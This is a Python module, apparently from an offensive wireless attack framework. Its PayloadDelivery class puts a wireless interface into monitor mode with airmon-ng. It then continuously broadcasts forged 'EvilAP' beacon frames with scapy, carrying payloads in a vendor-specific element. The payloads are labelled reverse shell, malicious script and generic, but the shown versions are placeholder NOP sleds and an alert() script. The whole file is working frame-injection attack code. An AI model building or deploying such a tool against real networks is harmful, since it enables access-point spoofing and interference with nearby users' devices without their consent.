import threading
import subprocess
import logging
import os
import time
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, RadioTap
from scapy.sendrecv import sendp
from scapy.all import conf

from .base_exploit import BaseExploit


class PayloadDelivery(BaseExploit):
    """
    A class to perform payload delivery by injecting malicious beacon frames
    or other wireless frames targeting specific devices or networks.
    """

    def __init__(self, core_framework, vulnerability,
                 essid='EvilAP',
                 payload_types=None,
                 injection_interval=0.1,
                 channel=None):
        """
        Initializes the PayloadDelivery exploit.

        Args:
            core_framework: The core framework instance.
            vulnerability: A dictionary containing vulnerability details.
            essid (str): The ESSID to advertise. Defaults to 'EvilAP'.
            payload_types (dict): A dictionary mapping payload types to their crafting functions.
            injection_interval (float): Time interval between packet injections in seconds.
            channel (int): The wireless channel to operate on. If None, uses the target network's channel.
        """
        super().__init__(core_framework, vulnerability)
        self.delivering = False
        self.vulnerability = vulnerability
        self.core = core_framework
        self.essid = essid
        self.injection_interval = injection_interval
        self.channel = channel or self.vulnerability.get('target_network', {}).get('channel')
        self.interface = self.core.packet_handler.packet_injector.interface
        self.stop_event = threading.Event()
        self.inject_thread = None
        self.payload_types = payload_types or {
            'reverse_shell': self._craft_reverse_shell_payload,
            'malicious_script': self._craft_malicious_script_payload,
            'generic': self._craft_generic_payload
        }
        self.logger = logging.getLogger(self.__class__.__name__)

        # Validate interface mode
        self._ensure_monitor_mode()

    def exploit(self):
        """
        Executes the payload delivery process.
        """
        self.logger.info("Starting Payload Delivery exploit.")
        target_device = self.vulnerability.get('target_device')

        if not target_device:
            self.logger.error("No target device specified for payload delivery.")
            return {"status": "error", "message": "No target device specified."}

        # Determine the payload type based on the vulnerability
        payload_type = self.vulnerability.get('payload_type', 'generic')

        # Craft the malicious payload
        payload = self._craft_payload(payload_type, target_device)

        if not payload:
            self.logger.error("Failed to craft payload.")
            return {"status": "error", "message": "Failed to craft payload."}

        # Start the payload injection thread
        try:
            self.delivering = True
            self.inject_thread = threading.Thread(target=self._inject_payload, args=(payload,), daemon=True)
            self.inject_thread.start()
            self.logger.info("Payload Delivery exploit initiated.")
            return {"status": "success"}
        except Exception as e:
            self.logger.exception(f"Failed to start payload delivery: {e}")
            return {"status": "error", "message": str(e)}

    def _ensure_monitor_mode(self):
        """
        Ensures that the network interface is in monitor mode.
        """
        try:
            mode = self.core.packet_handler.packet_injector.get_interface_mode()
            if mode != 'monitor':
                self.logger.info(f"Setting interface {self.interface} to monitor mode.")
                subprocess.check_call(['airmon-ng', 'start', self.interface],
                                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                self.logger.info(f"Interface {self.interface} set to monitor mode.")
            else:
                self.logger.debug(f"Interface {self.interface} is already in monitor mode.")
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Failed to set monitor mode on interface {self.interface}: {e}")
            raise
        except Exception as e:
            self.logger.exception(f"Unexpected error while setting monitor mode: {e}")
            raise

    def _inject_payload(self, payload):
        """
        Continuously injects the crafted payload into beacon frames.

        Args:
            payload (bytes): The malicious payload to inject.
        """
        self.logger.info("Starting payload injection loop.")
        try:
            while not self.stop_event.is_set():
                frame = self._build_frame(payload)
                sendp(frame, iface=self.interface, inter=self.injection_interval, verbose=False)
                self.logger.debug("Injected malicious beacon frame.")
                time.sleep(self.injection_interval)
        except Exception as e:
            self.logger.exception(f"Error during payload injection: {e}")
            self.stop_event.set()

    def _build_frame(self, payload):
        """
        Builds the malicious wireless frame with the payload.

        Args:
            payload (bytes): The malicious payload to inject.

        Returns:
            scapy.layers.dot11.RadioTap: The crafted wireless frame.
        """
        dot11 = Dot11(type=0, subtype=8,
                     addr1='FF:FF:FF:FF:FF:FF',  # Broadcast
                     addr2=self.core.packet_handler.packet_injector.get_interface_mac(),
                     addr3=self.core.packet_handler.packet_injector.get_interface_mac())
        beacon = Dot11Beacon(cap='ESS+privacy')
        essid = Dot11Elt(ID='SSID', info=self.essid, len=len(self.essid))
        # Adding a Vendor Specific element for the payload
        payload_element = Dot11Elt(ID=221, info=payload)
        frame = RadioTap() / dot11 / beacon / essid / payload_element
        return frame

    def _craft_payload(self, payload_type, target_device):
        """
        Crafts the malicious payload based on the specified type.

        Args:
            payload_type (str): The type of payload to craft.
            target_device (dict): Information about the target device.

        Returns:
            bytes: The crafted payload.
        """
        crafting_function = self.payload_types.get(payload_type, self.payload_types['generic'])
        return crafting_function(target_device)

    def _craft_reverse_shell_payload(self, target_device):
        """
        Crafts a reverse shell payload.

        Args:
            target_device (dict): Information about the target device.

        Returns:
            bytes: The crafted reverse shell payload.
        """
        # WARNING: Crafting actual reverse shells requires careful implementation.
        # This is a placeholder NOP sled.
        payload = b'\x90' * 100
        self.logger.debug("Crafted reverse shell payload.")
        return payload

    def _craft_malicious_script_payload(self, target_device):
        """
        Crafts a malicious script payload to be injected.

        Args:
            target_device (dict): Information about the target device.

        Returns:
            bytes: The crafted malicious script payload.
        """
        script = "<script>alert('Malicious Payload');</script>"
        payload = script.encode('utf-8')
        self.logger.debug("Crafted malicious script payload.")
        return payload

    def _craft_generic_payload(self, target_device):
        """
        Crafts a generic payload.

        Args:
            target_device (dict): Information about the target device.

        Returns:
            bytes: The crafted generic payload.
        """
        generic_payload = b'\x90' * 50  # NOP sled as a placeholder
        self.logger.debug("Crafted generic payload.")
        return generic_payload

    def cleanup(self):
        """
        Cleans up after exploitation to restore the environment.
        """
        self.logger.info("Cleaning up Payload Delivery exploit.")
        self.stop_event.set()

        if self.inject_thread and self.inject_thread.is_alive():
            self.inject_thread.join()
            self.logger.debug("Payload injection thread has been terminated.")

        self.delivering = False

        # Optionally, reset the interface to its original state
        try:
            subprocess.check_call(['airmon-ng', 'stop', self.interface],
                                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.logger.info(f"Interface {self.interface} set back to managed mode.")
        except subprocess.CalledProcessError as e:
            self.logger.warning(f"Failed to reset interface {self.interface} to managed mode: {e}")

        self.logger.info("Payload Delivery exploit stopped.")

    def _validate_vulnerability(self):
        """
        Validates the vulnerability dictionary for required fields.
        """
        required_fields = ['target_device']
        missing_fields = [field for field in required_fields if field not in self.vulnerability]
        if missing_fields:
            self.logger.error(f"Missing required vulnerability fields: {', '.join(missing_fields)}")
            raise ValueError(f"Missing required vulnerability fields: {', '.join(missing_fields)}")
